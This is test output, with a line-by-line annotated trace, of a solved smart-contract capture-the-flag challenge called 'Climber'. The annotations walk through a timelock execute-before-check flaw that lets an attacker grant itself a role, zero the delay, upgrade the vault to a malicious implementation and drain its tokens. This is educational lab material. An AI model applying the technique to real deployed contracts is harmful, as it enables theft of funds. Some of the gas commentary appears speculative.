└─$ forge test --match-path Climber.t.sol -vvvv 
[⠊] Compiling...
[⠊] Compiling 1 files with Solc 0.8.25
[⠒] Solc 0.8.25 finished in 1.89s
Compiler run successful!

Ran 2 tests for test/climber/Climber.t.sol:ClimberChallenge
[PASS] test_assertInitialState() (gas: 55081)
Traces:
  [55081] ClimberChallenge::test_assertInitialState()
    ├─ [0] VM::assertEq(100000000000000000 [1e17], 100000000000000000 [1e17]) [staticcall]
    │   └─ ← [Return]
    ├─ [7302] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2418] ClimberVault::getSweeper() [delegatecall]
    │   │   └─ ← [Return] sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040]
    │   └─ ← [Return] sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040]
    ├─ [0] VM::assertEq(sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040], sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040]) [staticcall]
    │   └─ ← [Return]
    ├─ [2675] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2291] ClimberVault::getLastWithdrawalTimestamp() [delegatecall]
    │   │   └─ ← [Return] 1
    │   └─ ← [Return] 1
    ├─ [0] VM::assertGt(1, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [2703] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2319] ClimberVault::owner() [delegatecall]
    │   │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    ├─ [0] VM::assertNotEq(ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7], 0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return]
    ├─ [703] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [319] ClimberVault::owner() [delegatecall]
    │   │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    ├─ [0] VM::assertNotEq(ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2359] ClimberTimelock::delay() [staticcall]
    │   └─ ← [Return] 3600
    ├─ [0] VM::assertEq(3600, 3600) [staticcall]
    │   └─ ← [Return]
    ├─ [2670] ClimberTimelock::hasRole(0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, proposer: [0x6bEf539e8319dACba4C2DaD055006E79682C0f32]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]
    ├─ [2516] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000000 [1e25]
    ├─ [0] VM::assertEq(10000000000000000000000000 [1e25], 10000000000000000000000000 [1e25]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_climber() (gas: 2187089)
Traces:
  [2196689] ClimberChallenge::test_climber()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [1085318] → new ClimberAttacker@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 4976 bytes of code
    ├─ [1060427] ClimberAttacker::attack()
    │   ├─ [464952] → new ClimberVaultV2@0x9B257fdD2D919d86B1CB04bfb7D939047BeF5c31
    │   │   └─ ← [Return] 2322 bytes of code
    │   ├─ [96107] ClimberTimelock::execute([0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 0xce110ab5927CC46905460D930CCa0c6fB4666219], [0, 0, 0, 0], [0x2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219, 0x24adbc5b0000000000000000000000000000000000000000000000000000000000000000, 0x4f1ef2860000000000000000000000009b257fdd2d919d86b1cb04bfb7d939047bef5c3100000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000, 0xb0604a26], 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [29541] ClimberTimelock::grantRole(0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, ClimberAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   ├─ emit RoleGranted(role: 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, account: ClimberAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], sender: ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [5455] ClimberTimelock::updateDelay(0)
    │   │   │   └─ ← [Stop]
    │   │   ├─ [13385] ERC1967Proxy::fallback(ClimberVaultV2: [0x9B257fdD2D919d86B1CB04bfb7D939047BeF5c31], 0x)
    │   │   │   ├─ [8492] ClimberVault::upgradeToAndCall(ClimberVaultV2: [0x9B257fdD2D919d86B1CB04bfb7D939047BeF5c31], 0x) [delegatecall]
    │   │   │   │   ├─ [318] ClimberVaultV2::proxiableUUID() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
    │   │   │   │   ├─ emit Upgraded(implementation: ClimberVaultV2: [0x9B257fdD2D919d86B1CB04bfb7D939047BeF5c31])
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [34163] ClimberAttacker::schedule()
    │   │   │   ├─ [27650] ClimberTimelock::schedule([0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 0xce110ab5927CC46905460D930CCa0c6fB4666219], [0, 0, 0, 0], [0x2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219, 0x24adbc5b0000000000000000000000000000000000000000000000000000000000000000, 0x4f1ef2860000000000000000000000009b257fdd2d919d86b1cb04bfb7d939047bef5c3100000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000, 0xb0604a26], 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [34292] ERC1967Proxy::fallback(DamnValuableToken: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   ├─ [33905] ClimberVaultV2::drain(DamnValuableToken: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [delegatecall]
    │   │   │   ├─ [2516] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000000 [1e25]
    │   │   │   ├─ [27670] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 10000000000000000000000000 [1e25])
    │   │   │   │   ├─ emit Transfer(from: ERC1967Proxy: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 10000000000000000000000000 [1e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [516] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [516] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000000 [1e25]
    ├─ [0] VM::assertEq(10000000000000000000000000 [1e25], 10000000000000000000000000 [1e25]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.36ms (758.40µs CPU time)

Ran 1 test suite in 10.86ms (2.36ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)


└─$ forge test --match-path Climber.t.sol -vvvv
# forge test        — run the Foundry test suite
# --match-path      — filter to only test files whose path contains "Climber.t.sol"
# -vvvv             — maximum verbosity: shows full call traces, logs, and gas for every call

# ─────────────────────────────────────────────
# COMPILATION
# ─────────────────────────────────────────────

[⠊] Compiling...
[⠊] Compiling 1 files with Solc 0.8.25   # Only 1 file changed since last run (incremental build)
[⠒] Solc 0.8.25 finished in 1.89s
Compiler run successful!                   # No errors or warnings — clean ABI + bytecode output

# ─────────────────────────────────────────────
# TEST SUITE SUMMARY
# ─────────────────────────────────────────────

Ran 2 tests for test/climber/Climber.t.sol:ClimberChallenge
# Both test functions discovered in ClimberChallenge:
#   1. test_assertInitialState()  — sanity check of setUp() output
#   2. test_climber()             — the actual exploit run

# ═════════════════════════════════════════════════════════════════════
# TEST 1: test_assertInitialState()
# Verifies that setUp() correctly wired up all contracts and balances.
# ═════════════════════════════════════════════════════════════════════

[PASS] test_assertInitialState() (gas: 55081)
# 55081 gas — all static calls, no storage writes; expected to be cheap

Traces:
  [55081] ClimberChallenge::test_assertInitialState()

    # ── Assert 1: player ETH balance ──────────────────────────────────
    ├─ [0] VM::assertEq(100000000000000000 [1e17], 100000000000000000 [1e17]) [staticcall]
    │   └─ ← [Return]
    # 0 gas — Foundry cheatcode, no EVM computation.
    # 1e17 wei == 0.1 ETH. Confirms vm.deal(player, 0.1 ether) worked in setUp().

    # ── Assert 2: vault sweeper address ───────────────────────────────
    ├─ [7302] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2418] ClimberVault::getSweeper() [delegatecall]
    # ERC1967Proxy has no getSweeper() — fallback() catches the call,
    # then delegatecalls to the ClimberVault implementation.
    # delegatecall executes ClimberVault code but reads from PROXY storage.
    │   │   └─ ← [Return] sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040]
    │   └─ ← [Return] sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040]
    ├─ [0] VM::assertEq(sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040], sweeper: [0x8e446A6009390481D167f3CFcA0B800881113040]) [staticcall]
    │   └─ ← [Return]
    # Confirms _sweeper was set to the `sweeper` actor address during initialize().

    # ── Assert 3: lastWithdrawalTimestamp > 0 ─────────────────────────
    ├─ [2675] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2291] ClimberVault::getLastWithdrawalTimestamp() [delegatecall]
    │   │   └─ ← [Return] 1
    # Returns 1 (not block.timestamp) because Foundry's default block.timestamp
    # in tests is 1 — a known Foundry quirk. Still satisfies assertGt(x, 0).
    │   └─ ← [Return] 1
    ├─ [0] VM::assertGt(1, 0) [staticcall]
    │   └─ ← [Return]
    # Passes — timestamp was set during initialize(), proving _updateLastWithdrawalTimestamp ran.

    # ── Assert 4 & 5: vault owner is timelock (not zero, not deployer) ─
    ├─ [2703] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2319] ClimberVault::owner() [delegatecall]
    │   │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    ├─ [0] VM::assertNotEq(ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7], 0x000...000) [staticcall]
    │   └─ ← [Return]
    # owner != address(0) — ownership was actually transferred (not left unset).

    ├─ [703] ERC1967Proxy::fallback() [staticcall]   # second owner() call (note: 703 gas — SLOAD cached)
    │   ├─ [319] ClimberVault::owner() [delegatecall]
    │   │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    │   └─ ← [Return] ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7]
    ├─ [0] VM::assertNotEq(ClimberTimelock: [0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    # owner != deployer — transferOwnership(timelock) ran; deployer has no remaining control.

    # ── Assert 6: timelock delay == 1 hour ────────────────────────────
    ├─ [2359] ClimberTimelock::delay() [staticcall]
    │   └─ ← [Return] 3600          # 3600 seconds == 1 hour, set in ClimberTimelock constructor
    ├─ [0] VM::assertEq(3600, 3600) [staticcall]
    │   └─ ← [Return]

    # ── Assert 7: proposer holds PROPOSER_ROLE ────────────────────────
    ├─ [2670] ClimberTimelock::hasRole(0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, proposer: [0x6bEf539e8319dACba4C2DaD055006E79682C0f32]) [staticcall]
    # 0xb09aa5... == keccak256("PROPOSER_ROLE") — the AccessControl role identifier
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]

    # ── Assert 8: vault token balance == 10M DVT ──────────────────────
    ├─ [2516] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000000 [1e25]   # 10_000_000 * 1e18 (18 decimals)
    ├─ [0] VM::assertEq(10000000000000000000000000 [1e25], 10000000000000000000000000 [1e25]) [staticcall]
    │   └─ ← [Return]

    └─ ← [Stop]

# ═════════════════════════════════════════════════════════════════════
# TEST 2: test_climber()
# The full exploit — drains 10M DVT from vault to recovery in 1 tx.
# ═════════════════════════════════════════════════════════════════════

[PASS] test_climber() (gas: 2187089)
# 2.18M gas — expensive due to two contract deployments + storage writes + token transfer.

Traces:
  [2196689] ClimberChallenge::test_climber()
  # Note: reported gas (2187089) < trace gas (2196689) because trace includes
  # setUp() context overhead not charged to the test itself.

    # ── Modifier: checkSolvedByPlayer ─────────────────────────────────
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [...])
    │   └─ ← [Return]
    # Both msg.sender AND tx.origin set to `player` for all subsequent calls.
    # Second argument (tx.origin) matters if any contract checks tx.origin.

    # ── Deploy ClimberAttacker ─────────────────────────────────────────
    ├─ [1085318] → new ClimberAttacker@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 4976 bytes of code
    # 1.08M gas to deploy — large because it stores timelock/vault/token/recovery
    # references and the batch arrays will be written to storage during attack().
    # Deployed at deterministic CREATE address (depends on player nonce).

    # ── Execute the exploit ────────────────────────────────────────────
    ├─ [1060427] ClimberAttacker::attack()

      # Step 1: Deploy malicious vault implementation
      ├─ [464952] → new ClimberVaultV2@0x9B257fdD2D919d86B1CB04bfb7D939047BeF5c31
      │   └─ ← [Return] 2322 bytes of code
      # 464K gas — UUPS + OwnableUpgradeable base adds significant initcode.
      # Address is deterministic (ClimberAttacker's CREATE nonce = 0).

      # ── timelock.execute() — THE EXPLOIT CALL ────────────────────────
      ├─ [96107] ClimberTimelock::execute(
      #   targets:      [timelock, timelock, vault_proxy, attacker]
      #   values:       [0, 0, 0, 0]
      #   dataElements: [grantRole(...), updateDelay(0), upgradeToAndCall(...), schedule()]
      #   salt:         bytes32(0)
      # )
      # 96K gas for the entire exploit batch — remarkably cheap for what it achieves.

        # ── Call 0: grantRole(PROPOSER_ROLE, attacker) ─────────────────
        ├─ [29541] ClimberTimelock::grantRole(0xb09aa5..., ClimberAttacker: [0xce110a...])
        │   ├─ emit RoleGranted(
        │   │     role:    0xb09aa5... (PROPOSER_ROLE),
        │   │     account: ClimberAttacker,
        │   │     sender:  ClimberTimelock    ← timelock grants to itself/others via execute()
        │   │   )
        │   └─ ← [Stop]
        # Pre-condition for call3 (schedule()): attacker now has PROPOSER_ROLE.
        # 29K gas — first SSTORE of a new role mapping entry (cold write).

        # ── Call 1: updateDelay(0) ──────────────────────────────────────
        ├─ [5455] ClimberTimelock::updateDelay(0)
        │   └─ ← [Stop]
        # Sets delay = 0. readyAtTimestamp = block.timestamp + 0 = block.timestamp.
        # Any operation scheduled now is IMMEDIATELY ReadyForExecution.
        # 5K gas — single SSTORE updating existing slot (warm write, cheaper).

        # ── Call 2: upgradeToAndCall(ClimberVaultV2, "") ────────────────
        ├─ [13385] ERC1967Proxy::fallback(ClimberVaultV2: [0x9B257f...], 0x)
        │   ├─ [8492] ClimberVault::upgradeToAndCall(ClimberVaultV2, 0x) [delegatecall]
        # Proxy fallback → delegatecall to current implementation (still ClimberVault).
        # _authorizeUpgrade() runs: checks onlyOwner → owner is timelock → msg.sender
        # is timelock (execute() uses functionCallWithValue) → passes. ✓
        │   │   ├─ [318] ClimberVaultV2::proxiableUUID() [staticcall]
        │   │   │   └─ ← [Return] 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
        # EIP-1967 implementation slot constant. OZ verifies the new implementation
        # returns the correct UUID to prevent accidentally upgrading to a non-UUPS contract.
        │   │   ├─ emit Upgraded(implementation: ClimberVaultV2: [0x9B257f...])
        # EIP-1967 standard event — proxy's implementation slot now points to ClimberVaultV2.
        # From this point, all proxy delegatecalls go to ClimberVaultV2.
        │   │   └─ ← [Stop]
        │   └─ ← [Return]

        # ── Call 3: this.schedule() — the self-scheduling trick ─────────
        ├─ [34163] ClimberAttacker::schedule()
        │   ├─ [27650] ClimberTimelock::schedule(
        #       Same targets/values/data/salt as the execute() call above.
        #       Produces the SAME operation ID = keccak256(abi.encode(..., bytes32(0))).
        #   )
        # Pre-conditions now satisfied (set by calls 0 and 1):
        #   ✓ msg.sender has PROPOSER_ROLE (granted by call0)
        #   ✓ delay == 0 (set by call1)
        #   ✓ operation state is Unknown (first time scheduling this ID)
        # Result: operations[id].readyAtTimestamp = block.timestamp + 0 = block.timestamp
        #         operations[id].known = true
        #         getOperationState(id) → ReadyForExecution  (because block.timestamp >= readyAtTimestamp)
        │   │   └─ ← [Stop]
        │   └─ ← [Stop]

        # [back in execute()] — state check now runs:
        # getOperationState(id) == ReadyForExecution ✓ (self-scheduled with delay=0)
        # operations[id].executed = true  ← marks as done, prevents replay
      └─ ← [Stop]   # execute() returns successfully

      # ── Post-exploit: drain the upgraded vault ─────────────────────
      ├─ [34292] ERC1967Proxy::fallback(DamnValuableToken: [0xfF2Bd...], recovery: [0x73030B...])
      │   ├─ [33905] ClimberVaultV2::drain(DamnValuableToken, recovery) [delegatecall]
      # Proxy now delegates to ClimberVaultV2. drain() has zero access control.
      # Executes in proxy's storage context — balanceOf(proxy) returns full vault balance.
      │   │   ├─ [2516] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA...]) [staticcall]
      │   │   │   └─ ← [Return] 10000000000000000000000000 [1e25]   # full 10M DVT
      │   │   ├─ [27670] DamnValuableToken::transfer(recovery: [0x73030B...], 10000000000000000000000000)
      │   │   │   ├─ emit Transfer(
      │   │   │   │     from:   ERC1967Proxy,   # vault proxy is the token holder
      │   │   │   │     to:     recovery,
      │   │   │   │     amount: 10000000000000000000000000  # 10M DVT — full balance
      │   │   │   │   )
      │   │   │   └─ ← [Return] true
      │   │   └─ ← [Stop]
      │   └─ ← [Return]

    └─ ← [Stop]   # attack() complete

    # ── Modifier: checkSolvedByPlayer → _isSolved() ───────────────────
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]

    # Win condition check 1: vault is empty
    ├─ [516] DamnValuableToken::balanceOf(ERC1967Proxy: [0x1240FA...]) [staticcall]
    │   └─ ← [Return] 0   # vault drained ✓
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]

    # Win condition check 2: recovery holds all tokens
    ├─ [516] DamnValuableToken::balanceOf(recovery: [0x73030B...]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000000 [1e25]   # 10M DVT received ✓
    ├─ [0] VM::assertEq(10000000000000000000000000 [1e25], 10000000000000000000000000 [1e25]) [staticcall]
    │   └─ ← [Return]

    └─ ← [Stop]

# ─────────────────────────────────────────────
# FINAL RESULTS
# ─────────────────────────────────────────────

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.36ms (758.40µs CPU time)
# Wall time: 2.36ms  — includes EVM setup and teardown
# CPU time:  0.76ms  — pure computation (EVM execution); remainder is I/O / process overhead

Ran 1 test suite in 10.86ms (2.36ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total)
# 10.86ms wall time includes Forge startup, file loading, and compilation check overhead.
# Both tests green — setUp() is correct and the exploit succeeds end-to-end.
